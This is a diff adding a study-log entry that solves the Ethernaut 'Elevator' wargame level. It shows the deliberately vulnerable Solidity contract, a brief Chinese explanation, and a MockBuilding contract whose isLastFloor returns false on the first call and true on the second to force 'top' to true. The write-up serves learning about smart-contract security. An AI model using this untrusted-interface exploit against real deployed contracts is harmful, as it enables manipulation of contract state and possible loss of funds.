@@ -103,6 +103,56 @@ await web3.eth.getStorageAt("0xC2205dfcB5Ef96C4357ad8CDe94e5348E1e33f3D",1)
 
 
 
-### 2024.07.12
+### 2024.08.30
+
+#### Ethernaut - Elevator
+
+```
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
+如果要top返回true，就要islastfloor第一次返回false，第二次返回true。building合约是调用的msg.sender，所以我们构造一个合约，其islastfloor函数满足这个逻辑就好，输入的参数不重要。
+
+```
+contract MockBuilding {
+    uint count=0;
+    function isLastFloor(uint256 a) external returns (bool){
+        if (count==0){
+            count++;
+            return false;
+        }else{
+            return true;
+        }
+    }
+    function callElevator(address addr) external{
+        Elevator(addr).goTo(0);
+    }
+}
+```
+
+
+### 2024.08.31
+
+
 
 <!-- Content_END -->
